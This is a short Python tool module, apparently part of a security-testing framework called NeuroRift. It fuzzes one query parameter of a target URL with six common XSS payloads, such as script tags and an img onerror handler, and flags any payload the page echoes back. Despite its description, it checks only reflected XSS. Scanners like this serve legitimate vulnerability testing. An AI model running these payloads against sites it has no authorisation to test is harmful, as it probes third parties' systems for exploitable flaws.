#!/usr/bin/env python3
"""NeuroRift tool: XSS testing (reflected, stored, DOM)."""

import requests
from tools import ToolResult

SCHEMA = {
    "type": "object",
    "required": ["target"],
    "properties": {
        "target": {"type": "string", "description": "URL to test for XSS"},
        "param": {
            "type": "string",
            "description": "Query parameter to fuzz",
            "default": "q",
        },
    },
}

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "${alert(1)}",
]


class XSSTool:
    name = "xss"
    description = "Test for reflected, stored, and DOM XSS vulnerabilities"

    @staticmethod
    def schema():
        return SCHEMA

    def run(self, target: str, param: str = "q") -> ToolResult:
        findings = []
        for payload in XSS_PAYLOADS:
            try:
                resp = requests.get(
                    target, params={param: payload}, timeout=10, verify=False
                )
                if payload.lower() in resp.text.lower():
                    findings.append(
                        {
                            "type": "xss_reflected",
                            "severity": "HIGH",
                            "payload": payload,
                            "param": param,
                            "url": resp.url,
                        }
                    )
                    break  # One confirmed finding is enough
            except requests.RequestException:
                continue
        return ToolResult(
            tool_name=self.name,
            target=target,
            success=True,
            findings=findings,
            raw_output=f"Tested {len(XSS_PAYLOADS)} payloads on param '{param}'",
        )
